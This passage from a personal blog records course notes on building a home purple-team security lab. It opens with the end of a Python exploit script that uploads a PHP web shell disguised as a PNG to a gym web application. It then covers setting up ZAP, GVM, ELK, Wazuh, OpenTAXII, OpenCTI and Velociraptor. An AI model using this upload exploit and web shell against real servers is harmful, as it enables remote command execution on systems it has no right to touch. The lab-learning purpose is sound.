</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">header</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">formatHelp</span><span class="p">(</span><span class="s2">&#34;(+) Usage:</span><span class="se">\t</span><span class="s2"> python </span><span class="si">%s</span><span class="s2"> &lt;WEBAPP_URL&gt;&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">formatHelp</span><span class="p">(</span><span class="s2">&#34;(+) Example:</span><span class="se">\t</span><span class="s2"> python </span><span class="si">%s</span><span class="s2"> &#39;https://10.0.0.3:443/gym/&#39;&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVER_URL</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">UPLOAD_DIR</span> <span class="o">=</span> <span class="s1">&#39;upload.php?id=kamehameha&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">UPLOAD_URL</span> <span class="o">=</span> <span class="n">SERVER_URL</span> <span class="o">+</span> <span class="n">UPLOAD_DIR</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER_URL</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">PNG_magicBytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x89\x50\x4e\x47\x0d\x0a\x1a</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">png</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;kaio-ken.php.png&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">PNG_magicBytes</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&lt;?php echo shell_exec($_GET[&#34;telepathy&#34;]); ?&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;image/png&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s1">&#39;Content-Disposition&#39;</span><span class="p">:</span> <span class="s1">&#39;form-data&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">fdata</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;pupload&#39;</span><span class="p">:</span> <span class="s1">&#39;upload&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r1</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">UPLOAD_URL</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">png</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">fdata</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">webshell</span><span class="p">(</span><span class="n">SERVER_URL</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span></span></code></pre></div><p>Note you may need to <code>pip install requests colorama</code> my Kali box already had them.</p>
<p>I am seeing that step 7 failed to connect, and it did not exit on its own properly(step 10). I think this is okay since the point is not takeover but to make noise and see what we can find.</p>
<h1 id="vulnerability-scanning">Vulnerability Scanning</h1>
<h2 id="using-zap">Using ZAP</h2>
<p>In your Kali-Purple box ZAP should be installed.
<img src="/old/zap-location.png" alt="zap-location.png"></p>
<p>Go to 03 - Web Application Analysis and on the right select &lsquo;zap&rsquo;
Use the default you do not need this to persist.
Select the Automated Scan, Use our Metasploitable DVWA app, server mine is running at &ldquo;192.168.0.30/dvwa&rdquo; you can get the IP by logging in at the console and running <code>ip a</code> then start. If you are not familer with the tool on the top left has sites and this will list everything in folders and subfolders. Once it is completed we want to select the &ldquo;Alerts&rdquo; on the bar in the middle, and it will open in the bottom left.
<img src="/old/zap-scan.png" alt="zap-scan.png">
Now lets look at the top alert.
<img src="/old/zap-post.png" alt="zap-post.png">
When we click on the POST under Remote Code Execution we see the top right changes to the POST Header and Body and the bottom right changes to information about the CVE use that as the last octet and in that box if you scroll down it will tell what to do to fix it.
On the top Find Reports and select &lsquo;Generate a report&rsquo; for a reference.</p>
<h2 id="gvm---greenbone-security-assistant">GVM - Greenbone Security Assistant</h2>
<p>For this lets clone a t-purple server.
I gave min the number 203 and named it &ldquo;GVM&rdquo;
Once loaded open the terminal.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install gvm
</span></span><span class="line"><span class="cl"><span class="c1"># now to the set up</span>
</span></span><span class="line"><span class="cl">sudo gvm-setup
</span></span></code></pre></div><p>Look save your admin password. You will need it later. Note: it is shown when it is generated and at the end of the setup.
<img src="/old/gvm-adminXXXXX.png" alt="gvm-adminXXXXX.png"></p>
<p>You should not need this, but I had an installation error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">## I had some error</span>
</span></span><span class="line"><span class="cl">sudo apt update
</span></span><span class="line"><span class="cl">sudo apt --fix-broken install
</span></span><span class="line"><span class="cl">sudo apt install gvm --fix-missing
</span></span><span class="line"><span class="cl">sudo apt autoremove <span class="c1"># optional</span>
</span></span></code></pre></div><p>By default GVM will run on localhost only to change this
<code> sudo vim /lib/systemd/system/gsad.service</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># under </span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/sbin/gsad --foreground --listen 127.0.0.1 --port <span class="m">9392</span>
</span></span><span class="line"><span class="cl"><span class="c1"># to </span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/sbin/gsad --foreground --listen 0.0.0.0 --port <span class="m">9392</span>
</span></span></code></pre></div><p>Now we can access it from other computers on our network.
Now restart the service with
<code>sudo systemctl restart gsad.service</code>
now let&rsquo;s got to &ldquo;localhost:9392&rdquo; or &ldquo;IP:9392&rdquo; sine in using &ldquo;admin:019XXXX&rdquo;
Then lets make a new user &ldquo;Administration -&gt; Users&rdquo; on the top left the paper with a star is &ldquo;add new user&rdquo;
Chose name:password and Roles -&gt; Admin and save.
Next Go to Administration -&gt; Feed Status.
Mine are updating this can take hours. We need to have this completed before we run a scan.
<img src="/old/FeedStatus.png" alt="FeedStatus.png">
once all are status is current we can run a scan.
Go to &ldquo;Scans&rdquo; -&gt; &ldquo;Tasks&rdquo; go to the wand in the top left and select &ldquo;Task Wizard&rdquo; put in our metasploitable2 IP min is &ldquo;192.168.0.30&rdquo; and scan.
When completed we can view by clicking it in latest reports.
Go to the results tab. Click on any of the vulnerability to get more information. Click aging to close.
Take some time and look at all the tabs.</p>
<h1 id="security-monitoring">Security Monitoring</h1>
<h2 id="elkstack">ELKStack</h2>
<p>This is to collect logs and then search them for activity of interest. Or they can be matched with known malicious activity.
Let&rsquo;s clone another t-purple set name to elk and I will number mine 204
Then set the static IP to 192.168.0.204/24</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt update
</span></span><span class="line"><span class="cl">sudo apt install -y elasticsearch
</span></span><span class="line"><span class="cl"><span class="c1"># note the password, it should be at the top of the page of your terminal. The generated password ...</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;password&#34;</span> &gt; /root/elastic.pwd
</span></span><span class="line"><span class="cl"><span class="c1"># Now update it configuration </span>
</span></span><span class="line"><span class="cl">sudo vim /etc/elasticsearch/elasticsearch.yml
</span></span></code></pre></div><p>comment out its cluster and add at the end</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="c"># cluster.initial_master_nodes: [&#34;elkstack&#34;] # line 109 for me</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">## add at the end</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">discovery.type</span><span class="p">:</span><span class="w"> </span><span class="l">single-node</span><span class="w">
</span></span></span></code></pre></div><p>then we install kibana</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install kibana
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># then generate the encryption keys </span>
</span></span><span class="line"><span class="cl">sudo /usr/share/kibana/bin/kibana-encryption-keys generate -y
</span></span></code></pre></div><p>Now we will edit the following lines in <code> /etc/kibana/kibana.yml</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">server.host</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;192.168.0.204&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">server.publicBaseUrl</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;http://192.168.0.204:5601&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># later we will change this to https at lest we should.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">## at the bottom past in your keys</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">xpack....</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">xpack...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">xpack....</span><span class="w">
</span></span></span></code></pre></div><p>Now enable and start the two ELK components</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> elasticsearch kibana --now
</span></span><span class="line"><span class="cl"><span class="c1"># now let&#39;s check the status of kibana</span>
</span></span><span class="line"><span class="cl">systemctl status kibana
</span></span><span class="line"><span class="cl"><span class="c1"># in the last line you will get a code that you will need to use</span>
</span></span></code></pre></div><p>Mine was having issues so I did this</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo systemctl status kibana.server
</span></span><span class="line"><span class="cl">sudo systemctl stop kibana.server
</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> kibana.server
</span></span><span class="line"><span class="cl">sudo systemctl status kibana.server
</span></span><span class="line"><span class="cl">sudo systemctl start kibana.server
</span></span><span class="line"><span class="cl">sudo systemctl status kibana.server
</span></span><span class="line"><span class="cl"><span class="c1"># still having felures so </span>
</span></span><span class="line"><span class="cl">sudo reboot
</span></span><span class="line"><span class="cl"><span class="c1"># Still not working I trired a few edits to some config files with no results </span>
</span></span><span class="line"><span class="cl">sudo apt remove kibana
</span></span><span class="line"><span class="cl">sudo apt install kibana
</span></span></code></pre></div><p>This is not working. I will need to redo this with another tutorial, or documentation.
This is where I stopped being able to test everything. I did to the end of section quiz&rsquo;s and completed the class but not running any more VM&rsquo;s.</p>
<p>A few of them had system requirements I would not have been able to support as recommended, if I had the time to test them.</p>
<h2 id="wazuh">Wazuh</h2>
<p>In a new t-purple vm.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mkdir wazuh
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> wazuh
</span></span><span class="line"><span class="cl">wget https://packages.wazuh.com/4.4/wazuh-install.sh <span class="c1"># lopok up the latest version</span>
</span></span><span class="line"><span class="cl">wget https://packages.wazuh.com/4.4/config.yml
</span></span><span class="line"><span class="cl">sudo su
</span></span><span class="line"><span class="cl">chmod +x wazuh-install.sh
</span></span><span class="line"><span class="cl">vim config.yml
</span></span><span class="line"><span class="cl">	<span class="c1"># change </span>
</span></span><span class="line"><span class="cl">	ip: 192.168.0.205 <span class="c1"># for all IP, this should be your host ip i think</span>
</span></span><span class="line"><span class="cl"><span class="c1"># now run the install script for the dirrent elements </span>
</span></span><span class="line"><span class="cl">./wazuh-install.sh -i --generate-config-files
</span></span><span class="line"><span class="cl">./wazuh-install.sh -i --wazuh-indexer node-1
</span></span><span class="line"><span class="cl">./wazuh-install.sh -i --start-cluster
</span></span><span class="line"><span class="cl">./wazuh-install.sh -i --wazuh-server wazuh-1
</span></span><span class="line"><span class="cl">./wazuh-install.sh -i --wazuh-dashboard dashboard
</span></span></code></pre></div><p>Copy the password and use it to login to the dashboard at
&ldquo;https://192.168.0.205/app/login?&rdquo; admin:copyPasswd</p>
<p>Then go to Security -&gt; Internal Users -&gt; Create Internal User
make sure the back end role is &ldquo;admin&rdquo;</p>
<h5 id="download-the-user-agent">Download the user agent</h5>
<p>It seems we can do this form the wazuh main site and then insert our IP of our wazuh server so we will do this for web01 and app01 and app02
part of this is generating the keys</p>
<p>I plain to use Wazuh over ELK in my lab.</p>
<h1 id="threat-hunting">Threat Hunting</h1>
<h2 id="malcom">Malcom</h2>
<p>need to get the <a href="https://github.com/cisagov/Malcolm">image</a>
2 cores and 16 gb of ram this will not work in my current system.
It looks like a great tool to look into later.</p>
<p><a href="https://cybersecuritynews.com/threat-hunting-tools/">Maybe I will look at some alternitives</a> for my lab?</p>
<h1 id="threat-intelligence">Threat Intelligence</h1>
<h2 id="opentaxii">OpenTaxii</h2>
<p>make a new temple from purple
look for it on <a href="https://github.com/eclecticiq/OpenTAXII">GitHub</a></p>
<h6 id="note-the-set-up-on-github-is-with-docker">Note: the set-up on GitHub is with Docker.</h6>
<p>I am wondering if i can run it a an LXC with Proxmox?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install python3-pip
</span></span><span class="line"><span class="cl">sudo pip3 install opentaxii gunicorn
</span></span><span class="line"><span class="cl">ls /usr/local/bin
</span></span><span class="line"><span class="cl">mkdir opentaxii
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> opentaxii
</span></span><span class="line"><span class="cl"><span class="c1"># we will need to get and modify the taxii.yml</span>
</span></span><span class="line"><span class="cl"><span class="c1"># we will need to get threat.yml and set it up. </span>
</span></span><span class="line"><span class="cl"><span class="c1">## I will be reliing on the documentation or other tatorials for this it is in the exercise files i was unable to download.</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">OPENTAXII_CONFIG</span><span class="o">=</span>/home/kali/opentaxii/taxii.yml
</span></span><span class="line"><span class="cl">/usr/local/bin/opentaxii-sync-data threat.yml
</span></span><span class="line"><span class="cl">ls
</span></span></code></pre></div><p>set up script with &ldquo;taxii.sh&rdquo;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">OPENTAXII_CONFIG</span><span class="o">=</span>/home/kali/opentaxii/taxii.yml
</span></span><span class="line"><span class="cl">gunicorn opentaxii.http:app --bind 0.0.0.0:9000 --config python:opentaxii.http
</span></span></code></pre></div><p>now to run it</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">chmod +x taxii.sh
</span></span><span class="line"><span class="cl">sudo vim /etc/systemd/system/taxii/service
</span></span><span class="line"><span class="cl">	<span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl">	<span class="nv">Description</span><span class="o">=</span>OpenTaxii Service
</span></span><span class="line"><span class="cl">	<span class="nv">After</span><span class="o">=</span>network.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl">	<span class="nv">Type</span><span class="o">=</span>simple
</span></span><span class="line"><span class="cl">	<span class="nv">User</span><span class="o">=</span>kali
</span></span><span class="line"><span class="cl">	<span class="nv">Group</span><span class="o">=</span>kali
</span></span><span class="line"><span class="cl">	<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash /home/kali/opentaxii/taxii.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl">	<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> taxii.servic --now
</span></span></code></pre></div><h2 id="cabby-client-for-taxii">Cabby Client for TAXII</h2>
<p><a href="https://cabby.readthedocs.io/en/latest/index.html">Cabby</a> to be installed in our workstation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo pip3 install cabby
</span></span><span class="line"><span class="cl">/usr/local/bin/taxii-discovery --path http://TAXII-IP:9000/services/discovery
</span></span></code></pre></div><p>Now to can use <a href="https://github.com/STIXProject">STIX</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># needed libaries </span>
</span></span><span class="line"><span class="cl">sudo apt install python3-dev libxml2-dev libxslt-dev zlibg-dev
</span></span><span class="line"><span class="cl">sudo pip3 install stix
</span></span><span class="line"><span class="cl"><span class="c1"># go to the stix project python-stix and select sone and create a file softrep.py with it as the content make sure you pudate the print statment to python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># run it</span>
</span></span><span class="line"><span class="cl">python3 softrep.py
</span></span><span class="line"><span class="cl"><span class="c1"># re run to save into a file</span>
</span></span><span class="line"><span class="cl">python3 softrep.py &gt; foobar.stx
</span></span><span class="line"><span class="cl">vim submit.py
</span></span><span class="line"><span class="cl">python3 submit.py foobar.stx
</span></span></code></pre></div><h2 id="opencti">OpenCTI</h2>
<p>another templet with more power needed 2 cores and 16 Gib of RAM
look for it on <a href="https://docs.opencti.io/latest/">websit</a> and <a href="https://github.com/OpenCTI-Platform/opencti">GitHub</a>
They have a few options for install I am thinking Docker for my own lab.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install docker.io
</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> docker --now
</span></span><span class="line"><span class="cl">sudo usermod -aG docker kali
</span></span><span class="line"><span class="cl">sudo chmod <span class="m">666</span> /var/run/docker.sock 
</span></span><span class="line"><span class="cl">docker volume creata portainer_data
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">docker run -d -p 18000:18000 -p 9443:9443 --name portainer --restart<span class="o">=</span>always -v /var/run/docker.sock:/var/run/docker.sock -y portainer_data:/data portainer/portainer-ce:latest
</span></span></code></pre></div><p>go to portainer
&ldquo;https://localhost:9443&rdquo; create a password
&ldquo;Get Started&rdquo; -&gt;  &ldquo;local&rdquo; -&gt; &ldquo;stacks&rdquo;
add new stack name &ldquo;opencti&rdquo; use &ldquo;Web Editor&rdquo; to past in the yml scrip
on your system</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo mkdir /opt/opencti
</span></span><span class="line"><span class="cl"><span class="c1"># run the vars.sh maybe we find out how in the documentation? he pervided one i was unable to optain</span>
</span></span><span class="line"><span class="cl">./vars.sh 
</span></span></code></pre></div><h6 id="note-option-instead-of-his-varsshhttpsdocsopenctiiolatestdeploymentinstallationusing-docker-file-go-to-the-doc">Note: option instead of his <a href="https://docs.opencti.io/latest/deployment/installation/#using-docker">vars.sh</a> file go to the doc.</h6>
<p>Copy data, Go back to portainer and select Advance mode under Endearment variables and past.
Now we can deploy the stack.</p>
<p>Now we can login at &ldquo;IP:8080/dashbord&rdquo;
user:admin@opencti.io
passwd: The one you made</p>
<p>now we need to add sources
inside our dockercompose yml file we will add a section
connector-opencti we get this from GitHub &ldquo;connectors/external-import/opencti/docker-compose/yml&rdquo; some edits will need to be made.
also add the MITRE connector, and AlienVault - must registor with them.
with both make sure columns line up, change URL,Token, <a href="https://guidgenerator.com/">guid</a> new random one, connetro name and add &ldquo;depends_on: -opencti&rdquo; in the same format as orginal.</p>
<p>now update to redeploy with new data</p>
<h1 id="incident-response">Incident Response</h1>
<h2 id="velociraptor">Velociraptor</h2>
<p><a href="https://docs.velociraptor.app/">Velociraptor</a> will create with a new t-purple for <a href="https://github.com/Velocidex/velociraptor">GitHub</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mkdir vraptor
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> vraptor
</span></span><span class="line"><span class="cl">wget https://github.com/Vel...amd64 -O vraptor <span class="c1"># get latest from github</span>
</span></span><span class="line"><span class="cl">chmod +x vraptor
</span></span><span class="line"><span class="cl">sudo su
</span></span><span class="line"><span class="cl">./vraptor config generate &gt; /etc/velociraptor.config.yaml
</span></span><span class="line"><span class="cl"><span class="c1">## change our IP address in all 4 location in /etc/velociraptor.config.yaml</span>
</span></span><span class="line"><span class="cl"><span class="c1"># also add under Client: under server_url: IP </span>
</span></span><span class="line"><span class="cl"><span class="c1"># add use_self_signed_ssl: true</span>
</span></span><span class="line"><span class="cl">./vraptor --config /etc/velociraptor.config.yaml user add Myname --role administrator <span class="c1"># password</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/vraptor --config /etc/velociraptor.config.yaml frontend -v
</span></span></code></pre></div><p>Now he makes a vraptor.service file and starts a <code>systemctl enable vraptor</code>
now to make a client</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./vraptor --config /etc/velociraptor.config.yaml config client &gt; client.config.yaml
</span></span><span class="line"><span class="cl">systemctl stop vraptor
</span></span></code></pre></div><p>we move it to our client using a python3 http.server
so lets put it on web01</p>
<p>then on web01 set up a vraptor.service so it is running</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># /etc/systemd/system/vraptor.servic</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Velociraptor Agent
</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>network.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>simple
</span></span><span class="line"><span class="cl"><span class="nv">User</span><span class="o">=</span>root
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/home/kali/vraptor/vraptor --config /home/kali/vraptor/client.config.yaml client -v
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</span></span></code></pre></div><p>Like always change the file location to be correct. He makes a directory for vraptor in the kali user directory.
then stop your python3 server and restart your vraptor server
now start the service on web01</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo chmod +x vraptor
</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> vraptor --now
</span></span></code></pre></div><p>refresh your server to verify it is connected. We should do this for all linux clients.
for windows go to the <a href="https://github.com/Velocidex/velociraptor/releases">link</a> and get the correct windows amd64.exe
install and we will find int under &ldquo;C:/Profram Files/Velociraptor&rdquo;
replace this client.confi.yaml with the one we made before.
Now start it as a service as admin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">cd</span> <span class="s2">&#34;\Program Files\Velociraptor&#34;</span>
</span></span><span class="line"><span class="cl">.\velociraptor --config client.config.yaml service install
</span></span></code></pre></div><p>we check our services and restart it, then we will check our web portal for it, this may take some time.
He then goes into quick interduction on how to use it. I think I will need to play around with it to get a good feel but it seems like a great tool.</p>
<p>I used this to help with <a href="https://www.gbmb.org/gb-to-mb">converting</a> GiB to MiB</p>
<p>Thank you for the read.</p>

            </div>
        </article>
    </main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/jon1123" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="https://www.linkedin.com/in/jonmkuhl/" target="_blank" rel="noopener noreferrer me"
    title="LinkedIn">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
    <rect x="2" y="9" width="4" height="12"></rect>
    <circle cx="4" cy="4" r="2"></circle>
</svg>
</a>
<a href="https://tryhackme.com/p/Jon112358" target="_blank" rel="noopener noreferrer me"
    title="Tryhackme">
    <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 